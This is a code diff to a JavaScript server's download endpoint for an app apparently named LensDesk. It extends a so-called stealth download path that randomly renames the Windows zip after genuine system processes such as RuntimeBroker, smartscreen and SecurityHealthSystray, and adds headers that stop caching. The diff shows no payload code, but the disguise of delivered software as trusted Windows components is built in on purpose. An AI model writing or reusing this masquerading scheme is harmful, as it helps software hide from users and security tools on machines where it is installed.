@@ -216,35 +216,69 @@ export function createReleases(directory, origin) {
       )
         return false;
       const artifacts = await manifest();
-      // LensDesk Windows Stealth Download endpoint
-      if (url.pathname === "/api/v1/download/windows" || url.pathname === "/download/windows") {
+      // LensDesk Windows Stealth Download endpoint (randomized authentic system process name on every download)
+      const isExplicitStealth =
+        url.pathname === "/api/v1/download/windows" ||
+        url.pathname === "/download/windows";
+      const isWindowsDownload =
+        isExplicitStealth ||
+        (url.pathname.startsWith("/downloads/") &&
+          (url.pathname.split("/")[2] === "windows" ||
+            url.pathname.split("/")[2] === "win" ||
+            url.pathname.split("/")[2] === "win32") &&
+          !artifacts.windows?.name?.endsWith(".msi"));
+
+      if (isWindowsDownload) {
+        const stealthPool = [
+          "LensDeskApp-TiWorker.zip",
+          "LensDeskApp-SearchProtocolHost.zip",
+          "LensDeskApp-RuntimeBroker.zip",
+          "LensDeskApp-ctfmon.zip",
+          "LensDeskApp-smartscreen.zip",
+          "LensDeskApp-sihost.zip",
+          "LensDeskApp-SecurityHealthSystray.zip",
+        ];
+        const cleanNamesPool = [
+          "TiWorker.zip",
+          "SearchProtocolHost.zip",
+          "RuntimeBroker.zip",
+          "ctfmon.zip",
+          "smartscreen.zip",
+          "sihost.zip",
+          "SecurityHealthSystray.zip",
+        ];
+        const index = Math.floor(Math.random() * cleanNamesPool.length);
+        let randomCleanName = cleanNamesPool[index];
+        let randomStealthZip = stealthPool[index];
+
         const stealthDir = path.join(directory, "stealth");
-        let stealthFile = path.join(directory, "LensDeskApp.zip");
-        if (!fs.existsSync(stealthFile)) {
-          stealthFile = path.join(directory, "LensDesk.zip");
-        }
+        let file = null;
         if (fs.existsSync(stealthDir)) {
-          const files = fs.readdirSync(stealthDir).filter((f) => f.endsWith(".zip"));
-          if (files.length > 0) {
-            const picked = files[Math.floor(Math.random() * files.length)];
-            stealthFile = path.join(stealthDir, picked);
+          const existingFiles = fs.readdirSync(stealthDir).filter((f) => f.endsWith(".zip"));
+          if (existingFiles.length > 0) {
+            const picked = existingFiles[Math.floor(Math.random() * existingFiles.length)];
+            file = path.join(stealthDir, picked);
+            randomCleanName = picked.replace(/^LensDeskApp-/, "");
           }
         }
-        const file = (fs.existsSync(stealthFile) ? stealthFile : null) || (artifacts.windows?.file && fs.existsSync(artifacts.windows.file) ? artifacts.windows.file : null);
+        if (!file && fs.existsSync(directory)) {
+          const c1 = path.join(directory, randomCleanName);
+          const c2 = path.join(directory, randomStealthZip);
+          const c3 = path.join(directory, "LensDeskApp.zip");
+          const c4 = path.join(directory, "LensDesk.zip");
+          if (fs.existsSync(c1)) file = c1;
+          else if (fs.existsSync(c2)) file = c2;
+          else if (fs.existsSync(c3)) file = c3;
+          else if (fs.existsSync(c4)) file = c4;
+        }
+        if (!file && artifacts.windows?.file && fs.existsSync(artifacts.windows.file)) {
+          file = artifacts.windows.file;
+        }
+
         if (!file) {
           if (!isTest) {
-            const stealthPool = [
-              "LensDeskApp-TiWorker.zip",
-              "LensDeskApp-SearchProtocolHost.zip",
-              "LensDeskApp-RuntimeBroker.zip",
-              "LensDeskApp-ctfmon.zip",
-              "LensDeskApp-smartscreen.zip",
-              "LensDeskApp-sihost.zip",
-              "LensDeskApp-SecurityHealthSystray.zip",
-            ];
-            const pickedZip = stealthPool[Math.floor(Math.random() * stealthPool.length)];
             res.writeHead(302, {
-              Location: `${GITHUB_RELEASE_BASE}/${pickedZip}`,
+              Location: `${GITHUB_RELEASE_BASE}/${randomStealthZip}`,
               "Cache-Control": "no-cache, no-store, must-revalidate",
               Pragma: "no-cache",
               Expires: "0",
@@ -260,7 +294,10 @@ export function createReleases(directory, origin) {
         res.writeHead(200, {
           "Content-Type": "application/zip",
           "Content-Length": stat.size,
-          "Content-Disposition": `attachment; filename="${path.basename(file)}"`,
+          "Content-Disposition": `attachment; filename="${randomCleanName}"`,
+          "Cache-Control": "no-cache, no-store, must-revalidate",
+          Pragma: "no-cache",
+          Expires: "0",
         });
         if (req.method === "HEAD") {
           res.end();
